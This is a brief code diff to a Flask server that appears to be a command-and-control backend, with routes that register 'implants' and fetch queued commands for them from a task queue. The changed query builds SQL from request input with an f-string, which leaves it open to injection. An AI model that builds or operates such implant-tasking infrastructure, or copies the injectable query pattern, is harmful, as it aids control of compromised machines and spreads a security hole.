@@ -106,12 +106,13 @@ def handle_execute():
 
 
 @app.route("/get_commands", methods=["POST"])
-def get_commands(id):
+def get_commands():
     data = request.json
     id = data['id']
     try:
         db_resp = tools.executeSelectQuery(
-            f"SELECT command FROM task_queue WHERE implant_id={id}")
+            f"SELECT command FROM task_queue WHERE target_implant_id={id}")
+        print(f"this is the db response: {db_resp}")
         return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print("failed to retrieve data on get_commands")
@@ -119,8 +120,6 @@ def get_commands(id):
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Register an implant, on the implant side
-
-
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
